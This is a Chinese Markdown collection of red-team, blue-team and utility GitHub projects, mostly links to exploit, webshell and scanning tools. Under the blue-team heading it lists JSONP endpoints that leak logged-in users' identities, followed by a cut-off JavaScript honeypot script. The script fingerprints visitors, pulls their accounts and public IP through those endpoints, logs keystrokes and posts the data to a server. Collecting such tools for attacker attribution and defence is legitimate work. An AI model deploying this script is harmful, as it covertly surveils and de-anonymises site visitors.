# GIThub 项目收集

> 自我感觉还有点用的项目的收集


# 红队

**信息收集**

- [GoScan](https://github.com/CTF-MissFeng/GoScan)

    > GoScan是采用Golang语言编写的一款分布式综合资产管理系统，Web端负责展示数据和接受输入，Client端负责任务运行。

- [nerve](https://github.com/PaytmLabs/nerve)

    > 持续进行的安全扫描工具

- [cms_poc_exp](https://github.com/1oid/cms_poc_exp)

    > cms漏洞插件搜集(一起来搜集)

- [gshark](https://github.com/madneal/gshark)

    > 方便有效地扫描github敏感信息。

- [vajra](https://github.com/r3curs1v3-pr0xy/vajra)

    > Vajra是一个高度可定制的基于目标和范围的自动化Web黑客框架，可在Web应用程序渗透测试期间自动执行无聊的侦察任务和对多个目标的相同扫描。

- [go-dork](https://github.com/dwisiswant0/go-dork)

    > 用Go语言编写的最快的Dork扫描仪。
    ```
    安装代码 GO111MODULE=on go get -v -u dw1.io/go-dork
    ```

- [DBJ](https://github.com/wgpsec/DBJ)

    > 大宝剑-信息收集和资产梳理工具

- [reverse-shell-generator]

- [MailSniper](https://github.com/dafthack/MailSniper)

    > MailSniper是一种渗透测试工具，用于在Microsoft Exchange环境中的电子邮件中搜索特定术语（密码，内部情报，网络体系结构信息等）。 它可以用作非管理用户来搜索自己的电子邮件，也可以用作管理员来搜索域中每个用户的邮箱。

- [wechat_info_collect](https://github.com/ecat-sec/wechat_info_collect)

    >  针对微信客户端的信息收集工具, 一键提取本地PC所有的微信信息, 包括微信号, 手机号等

- [WXDBDecrypt.NET](https://github.com/Mr0x01/WXDBDecrypt.NET)

    > 微信PC版数据库解密工具 .NET版本

- [AWS-Threat-Simulation-and-Detection](https://github.com/sbasu7241/AWS-Threat-Simulation-and-Detection)

    > 与Stratus Red团队检测AWS威胁

- [fsociety](https://github.com/fsociety-team/fsociety)

    > 模块化渗透测试框架
- [Gin and Juice Shop](https://portswigger.net/blog/gin-and-juice-shop-put-your-scanner-to-the-test)
    > Burp Suite中的go扫描器



**渗透工具**

- [poshkatz](https://github.com/Stealthbits/poshkatz)

    > poshkatz是一个用于Mimikatz的PowerShell模块，它有很多功能。

- [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

    > 默认密码备忘录

- [RedTeamTools](https://github.com/lengjibo/RedTeamTools)

    > 编写、修改的部分工具

- [FrpProPlugin](https://github.com/mstxq17/FrpProPlugin)

    > frp0.33修改版,过流量检测,免杀,支持加载远程配置文件可用于cs直接使用的插件。需要服务端适配，可以在release下载对应平台的服务端。

- [RedisWriteFile](https://github.com/r35tart/RedisWriteFile)

    > 通过 Redis 主从写出无损文件

- [proxylogscan](https://github.com/dwisiswant0/proxylogscan)

    > 一种快速工具，用于大规模扫描Microsoft Exchange服务器上的漏洞，允许攻击者绕过身份验证并冒充管理员(CVE-2021-26855)。

- [BlueShell](https://github.com/whitehatnote/BlueShell)

    > BlueShell是一个Go语言编写的持续远控工具，拿下靶机后，根据操作系统版本下载部署对应的bsClient

- [imagepayloadgen](https://github.com/NinjaJc01/imagepayloadgen)

    > 在JS中生成图像有效载荷以绕过过滤器

- [ProxyLogon](https://github.com/hausec/ProxyLogon)

    > 代理登录webshell

- [redteam_vul](https://github.com/r0eXpeR/redteam_vul)

    > 红队中易被攻击的一些重点系统漏洞整理

- [WhetherMysqlSham](https://github.com/BeichenDream/WhetherMysqlSham)

    >  检测目标Mysql数据库是不是蜜罐

- [ysomap](https://github.com/wh1t3p1g/ysomap)

    > 一个基于ysoserial的有用的Java反序列化利用框架s

- [swagger-exp](https://github.com/lijiejie/swagger-exp)

    > Swagger REST API 信息泄露利用工具

- [swagger-ui vulnerabilities](https://snyk.io/vuln/npm%3Aswagger-ui)

    > Swagger-ui 包中的已知漏洞。这不包括属于此包的依赖项的漏洞。自动发现并修复影响您的项目的漏洞。

- [FastTunnel](https://github.com/SpringHgui/FastTunnel)

    > NAT 内网穿透 远程内网计算机 域名访问内网站点 反向代理内网服务 花生壳 端口转发 http代理 微信 小程序

- [ZhouYu](https://github.com/threedr3am/ZhouYu)

    > Java - SpringBoot 持久化 WebShell

- [CTF工具](https://github.com/zardus/ctf-tools)

    > docker直接安装全包

    **Docker (version 1.7+)**

    ```bash
    git clone https://github.com/zardus/ctf-tools
    cd ctf-tools
    docker build -t ctf-tools .
    ```
    And run it with:
    ```
    docker run -it ctf-tools
    ```

    ```
    docker run -it zardus/ctf-tools
    ```

    > 或者vagrant
    ```
    Vagrant
    You can build a Vagrant VM with:

    wget https://raw.githubusercontent.com/zardus/ctf-tools/master/Vagrantfile
    vagrant plugin install vagrant-vbguest
    vagrant up
    And connect to it via:

    vagrant ssh
    ```


**流量抓取**

- [brute shark](https://github.com/odedshimon/BruteShark)

> BruteShark是一种网络取证分析工具（NFAT），增强型网络分析工具

- [mitmproxy2swagger](https://github.com/alufers/mitmproxy2swagger)
  >一个自动转换mitmproxy捕获到OpenAPI 3.0规范的工具。这意味着您可以通过运行应用程序并捕获流量来自动反向工程REST api。


**CVE-EXP**

- [CVE-2021-1732-Exploit](https://github.com/KaLendsi/CVE-2021-1732-Exploit)

- [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)

    > Sudo Baron Samedit Exploit

- [weblogic-framework](https://github.com/0nise/weblogic-framework)

    > CVE-2020-2551、CVE-2020-2555、CVE-2020-2883

- [CVE-2021-3449](https://github.com/terorie/cve-2021-3449)

    >实施CVE-2021-3449的概念验证漏洞  OpenSSL <1.1.1k DoS攻击

- [PocList](https://github.com/Yang0615777/PocList)

    ```
    繁琐漏洞简化为POC工具
    Alibaba-Nacos-Unauthorized
    ApacheDruid-RCE_CVE-2021-25646
    MS-Exchange-SSRF-CVE-2021-26885
    Oracle-WebLogic-CVE-2021-2109_RCE
    RG-CNVD-2021-14536
    RJ-SSL-VPN-UltraVires
    Redis-Unauthorized-RCE
    TDOA-V11.7-GetOnlineCookie
    VMware-vCenter-GetAnyFile
    yongyou-GRP-U8-XXE
    Oracle-WebLogic-CVE-2020-14883
    Oracle-WebLogic-CVE-2020-14882
    Apache-Solr-GetAnyFile
    F5-BIG-IP-CVE-2021-22986
    Sonicwall-SSL-VPN-RCE
    GitLab-Graphql-CNVD-2021-14193
    ```

- [Kernelhub](https://github.com/Ascotbe/Kernelhub)

    > 进20年windows提权漏洞脚本

| SecurityBulletin                   |                         Description                          |               OperatingSystem               |
| :--------------------------------- | :----------------------------------------------------------: | :-----------------------------------------: |
| [CVE-2021-1732](./CVE-2021-1732)   |                        Windows Win32k                        |           Windows 10/2019/Server            |
| [CVE-2021-1709](./CVE-2021-1709)   |                        Windows Win32k                        | Windows 7/8.1/10/2008/2012/2016/2019/Server |
| [CVE-2020-17087](./CVE-2020-17087) |  Windows Kernel Local Elevation of Privilege Vulnerability   | Windows 7/8.1/10/2008/2012/2016/2019/Server |
| [CVE-2020-16938](./CVE-2020-16938) |     Windows Kernel Information Disclosure Vulnerability      |               Windows Server                |
| [CVE-2020-16898](./CVE-2020-16898) |      Windows TCP/IP Remote Code Execution Vulnerability      |           Windows 10/2019/Server            |
| [CVE-2020-1472](./CVE-2020-1472)   |               Netlogon Elevation of Privilege                |     Windows 2008/2012/2016/2019/Server      |
| [CVE-2020-0796](./CVE-2020-0796)   |                 SMBv3 Remote Code Execution                  |               Windows Server                |
| [CVE-2020-0787](./CVE-2020-0787)   |       Windows Background Intelligent Transfer Service        |     Windows 7/8/10/2008/2012/2016/2019      |
| [CVE-2019-1458](./CVE-2019-1458)   |                Win32k Elevation of Privilege                 |        Windows 7/8/10/2008/2012/2016        |
| [CVE-2019-1388](./CVE-2019-1388)   |      Windows Certificate Dialog Elevation of Privilege       |       Windows 7/8/2008/2012/2016/2019       |
| [CVE-2019-0859](./CVE-2019-0859)   |                Win32k Elevation of Privilege                 |     Windows 7/8/10/2008/2012/2016/2019      |
| [CVE-2019-0803](./CVE-2019-0803)   |                Win32k Elevation of Privilege                 |     Windows 7/8/10/2008/2012/2016/2019      |
| [CVE-2018-8639](./CVE-2018-8639)   |                Win32k Elevation of Privilege                 |     Windows 7/8/10/2008/2012/2016/2019      |
| [CVE-2018-8453](./CVE-2018-8453)   |                Win32k Elevation of Privilege                 |     Windows 7/8/10/2008/2012/2016/2019      |
| [CVE-2018-8440](./CVE-2018-8440)   |             Windows ALPC Elevation of Privilege              |        Windows 7/8/10/2008/2012/2016        |
| [CVE-2018-8120](./CVE-2018-8120)   |                Win32k Elevation of Privilege                 |               Windows 7/2008                |
| [CVE-2018-1038](./CVE-2018-1038)   |            Windows Kernel Elevation of Privilege             |               Windows 7/2008                |
| [CVE-2018-0743](./CVE-2018-0743)   |      Windows Subsystem for Linux Elevation of Privilege      |               Windows 10/2016               |
| [CVE-2018-0833](./CVE-2018-0833)   |       SMBv3 Null Pointer Dereference Denial of Service       |               Windows 8/2012                |
| [CVE-2017-8464](./CVE-2017-8464)   |                  LNK Remote Code Execution                   |        Windows 7/8/10/2008/2012/2016        |
| [CVE-2017-0213](./CVE-2017-0213)   |              Windows COM Elevation of Privilege              |        Windows 7/8/10/2008/2012/2016        |
| [CVE-2017-0143](./CVE-2017-0143)   |                 Windows Kernel Mode Drivers                  |     Windows 7/8/10/2008/2012/2016/Vista     |
| [CVE-2017-0101](./CVE-2017-0101)   |        GDI Palette Objects Local Privilege Escalation        |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-7255](./CVE-2016-7255)   |                 Windows Kernel Mode Drivers                  |     Windows 7/8/10/2008/2012/2016/Vista     |
| [CVE-2016-3371](./CVE-2016-3371)   |            Windows Kernel Elevation of Privilege             |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-3309](./CVE-2016-3309)   |                Win32k Elevation of Privilege                 |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-3225](./CVE-2016-3225)   |          Windows SMB Server Elevation of Privilege           |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-0099](./CVE-2016-0099)   |                    Secondary Logon Handle                    |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-0095](./CVE-2016-0095)   |                Win32k Elevation of Privilege                 |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-0051](./CVE-2016-0051)   |                WebDAV Elevation of Privilege                 |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2016-0041](./CVE-2016-0041)   |       Win32k Memory Corruption Elevation of Privilege        |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2015-2546](./CVE-2015-2546)   |       Win32k Memory Corruption Elevation of Privilege        |       Windows 7/8/10/2008/2012/Vista        |
| [CVE-2015-2387](./CVE-2015-2387)   |                 ATMFD.DLL Memory Corruption                  |     Windows 7/8/2003/2008/2012/Vista/Rt     |
| [CVE-2015-2370](./CVE-2015-2370)   |              Windows RPC Elevation of Privilege              |     Windows 7/8/10/2003/2008/2012/Vista     |
| [CVE-2015-1725](./CVE-2015-1725)   |                Win32k Elevation of Privilege                 |     Windows 7/8/10/2003/2008/2012/Vista     |
| [CVE-2015-1701](./CVE-2015-1701)   |                 Windows Kernel Mode Drivers                  |          Windows 7/2003/2008/Vista          |
| [CVE-2015-0062](./CVE-2015-0062)   |        Windows Create Process Elevation of Privilege         |            Windows 7/8/2008/2012            |
| [CVE-2015-0057](./CVE-2015-0057)   |                Win32k Elevation of Privilege                 |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2015-0003](./CVE-2015-0003)   |                Win32k Elevation of Privilege                 |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2015-0002](./CVE-2015-0002)   | Microsoft Application Compatibility Infrastructure Elevation of Privilege |         Windows 7/8/2003/2008/2012          |
| [CVE-2014-6324](./CVE-2014-6324)   |               Kerberos Checksum Vulnerability                |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2014-6321](./CVE-2014-6321)   |           Microsoft Schannel Remote Code Execution           |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2014-4113](./CVE-2014-4113)   |              Win32k.sys Elevation of Privilege               |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2014-4076](./CVE-2014-4076)   |                TCP/IP Elevation of Privilege                 |                Windows 2003                 |
| [CVE-2014-1767](./CVE-2014-1767)   |       Ancillary Function Driver Elevation of Privilege       |      Windows 7/8/2003/2008/2012/Vista       |
| [CVE-2013-5065](./CVE-2013-5065)   |                         NDProxy.sys                          |               Windows XP/2003               |
| [CVE-2013-1345](./CVE-2013-1345)   |                        Kernel Driver                         |   Windows 7/8/2003/2008/2012/Vista/Rt/Xp    |
| [CVE-2013-1332](./CVE-2013-1332)   |        DirectX Graphics Kernel Subsystem Double Fetch        |     Windows 7/8/2003/2008/2012/Vista/Rt     |
| [CVE-2013-0008](./CVE-2013-0008)   |               Win32k Improper Message Handling               |       Windows 7/8/2008/2012/Vista/Rt        |
| [CVE-2012-0217](./CVE-2012-0217)   |                         Service Bus                          |           Windows 7/2003/2008/Xp            |
| [CVE-2012-0002](./CVE-2012-0002)   |                   Remote Desktop Protocol                    |        Windows 7/2003/2008/Vista/Xp         |
| [CVE-2011-2005](./CVE-2011-2005)   |       Ancillary Function Driver Elevation of Privilege       |               Windows 2003/Xp               |
| [CVE-2011-1974](./CVE-2011-1974)   |               NDISTAPI Elevation of Privilege                |               Windows 2003/Xp               |
| [CVE-2011-1249](./CVE-2011-1249)   |       Ancillary Function Driver Elevation of Privilege       |        Windows 7/2003/2008/Vista/Xp         |
| [CVE-2011-0045](./CVE-2011-0045)   |              Windows Kernel Integer Truncation               |                 Windows Xp                  |
| [CVE-2010-4398](./CVE-2010-4398)   |       Driver Improper Interaction with Windows Kernel        |        Windows 7/2003/2008/Vista/Xp         |
| [CVE-2010-3338](./CVE-2010-3338)   |                        Task Scheduler                        |            Windows 7/2008/Vista             |
| [CVE-2010-2554](./CVE-2010-2554)   |                   Tracing Registry Key ACL                   |            Windows 7/2008/Vista             |
| [CVE-2010-1897](./CVE-2010-1897)   |                    Win32k Window Creation                    |        Windows 7/2003/2008/Vista/Xp         |
| [CVE-2010-0270](./CVE-2010-0270)   |                    SMB Client Transaction                    |               Windows 7/2008                |
| [CVE-2010-0233](./CVE-2010-0233)   |                  Windows Kernel Double Free                  |       Windows 2000/2003/2008/Vista/Xp       |
| [CVE-2010-0020](./CVE-2010-0020)   |                    SMB Pathname Overflow                     |      Windows 7/2000/2003/2008/Vista/Xp      |
| [CVE-2009-2532](./CVE-2009-2532)   |                     SMBv2 Command Value                      |             Windows 2008/Vista              |
| [CVE-2009-0079](./CVE-2009-0079)   |               Windows RPCSS Service Isolation                |               Windows 2003/Xp               |
| [CVE-2008-4250](./CVE-2008-4250)   |                        Server Service                        |         Windows 2000/2003/Vista/Xp          |
| [CVE-2008-4037](./CVE-2008-4037)   |                  SMB Credential Reflection                   |       Windows 2000/2003/2008/Vista/Xp       |
| [CVE-2008-3464](./CVE-2008-3464)   |                     AFD Kernel Overwrite                     |               Windows 2003/Xp               |
| [CVE-2008-1084](./CVE-2008-1084)   |                          Win32.sys                           |       Windows 2000/2003/2008/Vista/Xp       |
| [CVE-2006-3439](./CVE-2006-3439)   |                    Remote Code Execution                     |            Windows 2000/2003/Xp             |
| [CVE-2005-1983](./CVE-2005-1983)   |                         PnP Service                          |               Windows 2000/Xp               |
| [CVE-2003-0352](./CVE-2003-0352)   |               Buffer Overrun In RPC Interface                |           Windows 2000/2003/Xp/Nt           |


**靶场/漏洞复现**


- [IoT-vulhub](https://github.com/firmianay/IoT-vulhub)

    > IoT 固件漏洞复现环境









# 蓝队

**威胁情报收集**

- [tig](https://github.com/wgpsec/tig)

    > 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率，目前已集成微步、IP 域名反查、Fofa 信息收集、ICP 备案查询、IP 存活检测五个模块，现已支持以下信息的查询：

- [mquery](https://github.com/CERT-Polska/mquery)

    > YARA恶意软件查询加速器(web前端)

- [网络安全应急响应工具](https://github.com/MountCloud/FireKylin)

    >  在应对安全事件上机排查时，对于没有此方面经验但是有研判能力的安全专家来讲，经常苦于需要参考各种安全手册进行痕迹采集、整理、研判，此时我们可以使用FireKylin-Agent进行一键痕迹收集，降低排查安全专家收集工作的难度。

- [RedGuard](https://github.com/wikiZ/RedGuard)
    > C2流量检测拦截工具

## 信息收集

```
http://burp/favicon.ico
https://openfpcdn.io/fingerprintjs/v3
https://verify.cmpassport.com/h5/httpsPreGetmobile
https://www.taobao.com/help/getip.php?callback=ipCallback
https://www.yy.com/yyweb/user/queryUserInfo.json?callback=jsonp
https://www.cmpassport.com/h5/onekeylogin/getNewUnicomPhonescrip
https://www.cmpassport.com/h5/onekeylogin/getNewTelecomPhonescrip
https://tieba.baidu.com/tbmall/gettdouiconinfo?callback=jsonp1613919078534
https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback=bd
https://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_16073033003861
https://v2.sohu.com/api/pc-home-city/home-data/ip2location?_=1606458878259&callback=jQuery1124018281896477578718_1606458878259
https://id6.me/auth/preauth.do?paramKey=10F72757C5A5A12B0A6DA61E62BDF3238163CC31B9CC3CC506CCD6BF67D3BC8CEEC92DAF1ED125BC4F681D118A2ED62D8CD18EE0629220BD69802469FAB4E1C62067CA310EDC5E1A2DCDCF0E8202AA852D611A0B78364344F15A866395C9AAF3C1061C9F6B1ACDCAB232960AC6F14D615ED5184184BDB125AC647A8422EC25D7&clientType=2&paramStr=39826A2D6BADA0327947D80463C1422C01D472F90ECC1B7FC72D262D1C7AC4FC201506C46971655C6C67C5714F232A532126204E40DD35C24C4264AC5D106D9EBEFEBB98157CB7230F5F8BF1788608CA3CF9F38998815804A4652BF20C1EB763525257296155BAF2B4B46836ED276DE6944344B4135D94555640885B4363C4AD&appId=8013416909&format=jsonp&sign=C733AA0C9B2F41175F94344CAF0AA227C2F2B199&version=1.5&
https://opencloud.wostore.cn/openapi/netauth/precheck/wp?timeStamp=1659325750804&packname=xxx&business_type=1&format=jsonp&sign=FCE6F4692C5FEDD8993FDEBD079EBF49&callback=getNewUnicomPhone&fp=&client_type=7&version=v4.5&client_id=99166000000000000228&key=c4ZMLe9%2F1iX9Do2h4FGMqy5vC0IzZ%2Fgj9LePAFU%2BwTSc%2BHUbB6W1arA9YDRqR7HjFok226YHwwJrLq06Da%2BBMBM%2FPV7%2FexfV3uV%2BbR0xzMz4Xy%2F1pKyIriuaXA%2BieaQeYtvjXs1gTYXWc%2F8vZb3TODk9cKywn9FOI7m3iqrJUko%3D&packsign=xxx&
https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler
https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler
```

绿盟JS代码
```javascript
<script>"use strict";

function ajax(params) {
  params = params || {};
  params.data = params.data || {};
  var json = params.jsonp ? jsonp(params) : json(params);

  function jsonp(params) {
    var callbackName = params.jsonp;
    var head = document.getElementsByTagName('head')[0];
    params.data['callback'] = callbackName;
    var data = formatParams(params.data);
    var script = document.createElement('script');
    head.appendChild(script);

    window[callbackName] = function (json) {
      head.removeChild(script);
      clearTimeout(script.timer);
      window[callbackName] = null;
      params.success && params.success(json);
    };

    script.src = params.url + '?' + data;

    if (params.time) {
      script.timer = setTimeout(function () {
        window[callbackName] = null;
        head.removeChild(script);
        params.error && params.error({
          message: 'long time'
        });
      }, time);
    }
  }

  function formatParams(data) {
    var arr = [];

    for (var name in data) {
      arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
    } // arr.push('v=' + random());


    return arr.join('&');
  }

  function random() {
    return Math.floor(Math.random() * 10000 + 500);
  }
}

function BrowserType(url) {
  var ua = navigator.userAgent.toLowerCase();

  var testUa = function testUa(regexp) {
    return regexp.test(ua);
  };

  var testVs = function testVs(regexp) {
    return ua.match(regexp).toString().replace(/[^0-9|_.]/g, "").replace(/_/g, ".");
  };

  var system = "unknow";

  if (testUa(/windows|win32|win64|wow32|wow64/g)) {
    system = "windows";
  } else if (testUa(/macintosh|macintel/g)) {
    system = "macos";
  } else if (testUa(/x11/g)) {
    system = "linux";
  } else if (testUa(/android|adr/g)) {
    system = "android";
  } else if (testUa(/ios|iphone|ipad|ipod|iwatch/g)) {
    system = "ios";
  }

  var systemVs = "unknow";

  if (system === "windows") {
    if (testUa(/windows nt 5.0|windows 2000/g)) {
      systemVs = "2000";
    } else if (testUa(/windows nt 5.1|windows xp/g)) {
      systemVs = "xp";
    } else if (testUa(/windows nt 5.2|windows 2003/g)) {
      systemVs = "2003";
    } else if (testUa(/windows nt 6.0|windows vista/g)) {
      systemVs = "vista";
    } else if (testUa(/windows nt 6.1|windows 7/g)) {
      systemVs = "7";
    } else if (testUa(/windows nt 6.2|windows 8/g)) {
      systemVs = "8";
    } else if (testUa(/windows nt 6.3|windows 8.1/g)) {
      systemVs = "8.1";
    } else if (testUa(/windows nt 10.0|windows 10/g)) {
      systemVs = "10";
    }
  } else if (system === "macos") {
    //systemVs = testVs(/os x [\d._]+/g)
  } else if (system === "android") {
    //systemVs = testVs(/android [\d._]+/g)
  } else if (system === "ios") {
    //systemVs = testVs(/os [\d._]+/g)
  }

  var platform = "unknow";

  if (system === "windows" || system === "macos" || system === "linux") {
    platform = "desktop";
  } else if (system === "android" || system === "ios" || testUa(/mobile/g)) {
    platform = "mobile";
  }

  var engine = "unknow";
  var supporter = "unknow";

  if (testUa(/applewebkit/g)) {
    engine = "webkit";

    if (testUa(/edge/g)) {
      supporter = "edge";
    } else if (testUa(/opr/g)) {
      supporter = "opera";
    } else if (testUa(/chrome/g)) {
      supporter = "chrome";
    } else if (testUa(/safari/g)) {
      supporter = "safari";
    }
  } else if (testUa(/gecko/g) && testUa(/firefox/g)) {
    engine = "gecko";
    supporter = "firefox";
  } else if (testUa(/presto/g)) {
    engine = "presto";
    supporter = "opera";
  } else if (testUa(/trident|compatible|msie/g)) {
    engine = "trident";
    supporter = "iexplore";
  }

  var engineVs = "unknow";

  if (engine === "webkit") {
    engineVs = testVs(/applewebkit\/[\d._]+/g);
  } else if (engine === "gecko") {
    engineVs = testVs(/gecko\/[\d._]+/g);
  } else if (engine === "presto") {
    engineVs = testVs(/presto\/[\d._]+/g);
  } else if (engine === "trident") {
    engineVs = testVs(/trident\/[\d._]+/g);
  }

  var supporterVs = "unknow";

  if (supporter === "chrome") {
    supporterVs = testVs(/chrome\/[\d._]+/g);
  } else if (supporter === "safari") {
    supporterVs = testVs(/version\/[\d._]+/g);
  } else if (supporter === "firefox") {
    supporterVs = testVs(/firefox\/[\d._]+/g);
  } else if (supporter === "opera") {
    supporterVs = testVs(/opr\/[\d._]+/g);
  } else if (supporter === "iexplore") {
    supporterVs = testVs(/(msie [\d._]+)|(rv:[\d._]+)/g);
  } else if (supporter === "edge") {
    supporterVs = testVs(/edge\/[\d._]+/g);
  }

  var shell = "none";
  var shellVs = "unknow";

  if (testUa(/micromessenger/g)) {
    shell = "wechat";
    shellVs = testVs(/micromessenger\/[\d._]+/g);
  } else if (testUa(/qqbrowser/g)) {
    shell = "qq";
    shellVs = testVs(/qqbrowser\/[\d._]+/g);
  } else if (testUa(/ucbrowser/g)) {
    shell = "uc";
    shellVs = testVs(/ucbrowser\/[\d._]+/g);
  } else if (testUa(/qihu 360se/g)) {
    shell = "360";
  } else if (testUa(/2345explorer/g)) {
    shell = "2345";
    shellVs = testVs(/2345explorer\/[\d._]+/g);
  } else if (testUa(/metasr/g)) {
    shell = "sougou";
  } else if (testUa(/lbbrowser/g)) {
    shell = "liebao";
  } else if (testUa(/maxthon/g)) {
    shell = "maxthon";
    shellVs = testVs(/maxthon\/[\d._]+/g);
  }

  var languages = navigator.languages || navigator.language || navigator.userLanguage;
  var CPUInfo = navigator.platform;
  var CPUNumber = navigator.hardwareConcurrency;
  var canvas = document.createElement("canvas");
  var gl = canvas.getContext("experimental-webgl");
  var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
  var VideoCardSuppliers = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
  var GraphicsCardRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  var ScreenWidth = window.screen.width;
  var ScreenHeight = window.screen.height;
  var ColorDepth = window.screen.colorDepth; // var NetType = navigator.connection.type;

  var res = Object.assign({
    engine: engine,
    engineVs: engineVs,
    platform: platform,
    supporter: supporter,
    supporterVs: supporterVs,
    system: system,
    systemVs: systemVs,
    languages: languages,
    CPUInfo: CPUInfo,
    CPUNumber: CPUNumber,
    VideoCardSuppliers: VideoCardSuppliers,
    GraphicsCardRenderer: GraphicsCardRenderer,
    ScreenWidth: ScreenWidth,
    ScreenHeight: ScreenHeight,
    ColorDepth: ColorDepth
  }, shell === "none" ? {} : {
    shell: shell,
    shellVs: shellVs
  });
  // var formData = new FormData();
  // formData.append('jInfo', window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))); // bt

  fetch(url, {
    cache: "no-cache",
    method: "POST",
    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(res))))
  });
}


ajax({
  url: 'https://www.taobao.com/help/getip.php',
  jsonp: 'ipCallback',
  data: {},
  success: function success(res) {
    localStorage.setItem('pub_ip', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://tieba.baidu.com/tbmall/gettdouiconinfo',
  jsonp: 'jsonp1613919078534',
  data: {},
  success: function success(res) {
    localStorage.setItem('baidu', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo',
  jsonp: 'autoLoginHandler',
  data: {'areaid': 6, 'appid': 10, 'format': 'jsonp', 'method': 'autoLoginHandler', 'autoLoginHandler': '', '_': '1607051376245'},
  success: function success(res) {
    localStorage.setItem('qidian', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://www.yy.com/yyweb/user/queryUserInfo.json',
  jsonp: 'jsonp',
  data: {},
  success: function success(res) {
    localStorage.setItem('yy', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});

ajax({
  url: 'https://v2.sohu.com/api/pc-home-city/home-data/ip2location',
  jsonp: 'jQuery1124018281896477578718_1606458878259',
  data: {'_': '1606458878259'},
  success: function success(res) {
    localStorage.setItem('sohu_public_ip', JSON.stringify(res));
  },
  error: function error(_error) {
    console.log(_error);
  }
});


function send_data(types) {
  var data = {};
  data["public_ip"] = {};

  try {
    data["public_ip"]['taobao_public_ip'] = JSON.parse(localStorage.getItem('pub_ip'))['ip'];
  } catch (e) {
    data["public_ip"]['taobao_public_ip'] = "taobaoip获取接口可能已失效或者未设置，请尽快检查";
  } finally {}
  try {
        data["public_ip"]["sohu_public_ip"] = JSON.parse(localStorage.getItem('sohu_public_ip'))["data"]["ip"];
      } catch (e) {
        data["public_ip"]['sohu_public_ip'] = "sohu_ip获取接口可能已失效或者未设置，请尽快检查";
      } finally {}

  types.forEach(function (item) {
  if (item.endsWith("ip")){

  }else{
      data[item] = JSON.parse(localStorage.getItem(item));
    }
  });
  // var jp = new FormData();
  // jp.append("jInfo", window.btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
  fetch('/other_data', {
    method: 'POST',
    cache: "no-cache",
    body: window.btoa(unescape(encodeURIComponent(JSON.stringify(data))))
  });
}

var logger = "";

var keyDown = function keyDown(e) {
  var e = e || event;
  var currKey = e.keyCode || e.which || e.charCode;
  var keyName = ""
  if (currKey > 7 && currKey < 32 || currKey > 31 && currKey < 47) {
    switch (currKey) {
      case 8:
        keyName = "[退格]";
        break;

      case 9:
        keyName = "[制表]";
        break;

      case 13:
        keyName = "[回车]";
        break;
      //case 16:keyName = "[shift]"; break;

      case 17:
        keyName = "[Ctrl]";
        break;

      case 18:
        keyName = "[Alt]";
        break;

      case 20:
        keyName = "[大小写]";
        break;

      case 32:
        keyName = "[空格]";
        break;

      case 33:
        keyName = "[PageUp]…</script>
```


# 代码审计

**灰/黑盒审计**

- [openrasp-iast](https://github.com/baidu-security/openrasp-iast)
- https://github.com/baidu/openrasp

    > IAST 灰盒扫描工具

- [kiwi](https://github.com/alpha1e0/kiwi)

# 办公

- [Music Time for Spotify](https://github.com/swdotcom/swdc-vscode-musictime)

    > Music Time for Spotify 是 VS Code 的一个扩展，它可以在你编码时发现最高效的音乐。

- [SDKMAN! CLI](https://github.com/sdkman/sdkman-cli)
    > SDKMAN是一种工具，用于在任何基于Unix的系统上管理多个软件开发工具包的并行版本。它提供了一个方便的命令行界面，用于安装、切换、删除和列出候选程序。


- [AdGuardHome](https://github.com/AdguardTeam/AdGuardHome)

 > 全网范围的广告和跟踪器阻止了DNS服务器

**使用docker拉取**

```
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes --credential yes
docker buildx create --name buildx-builder --driver docker-container --use

docker pull adguard/adguardhome
docker run --name adguardhome \
    -v /my/own/workdir:/opt/adguardhome/work \
    -v /my/own/confdir:/opt/adguardhome/conf \
    -p 53:53/tcp -p 53:53/udp \
    -p 80:80/tcp -p 3000:3000/tcp \
    -p 67:67/udp -p 68:68/tcp -p 68:68/udp \
    -p 443:443/tcp \
    -p 853:853/tcp \
    -d adguard/adguardhome

访问http://127.0.0.1:3000
```
> 报错：docker: Error response from daemon: driver failed programming external connectivity on endpoint lamp
> 原因：docker服务启动时定义的自定义链DOCKER被清除
重启即可`systemctl restart docker`


替换端口版本
```
